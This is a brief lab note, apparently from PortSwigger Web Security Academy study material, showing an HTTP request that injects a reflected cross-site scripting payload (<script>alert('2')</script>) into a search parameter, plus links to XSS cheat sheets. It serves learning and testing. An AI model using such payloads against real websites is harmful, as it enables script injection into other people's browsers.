[Volver](../../../README.md)

# XSS REFLECTED NO ENCODE 

```
GET /?search=<script>alert("2")</script> HTTP/1.1
Host: xxx.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://xxx.web-security-academy.net/
Cookie: session=SESSION
Upgrade-Insecure-Requests: 1
```

## cheat sheet

- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45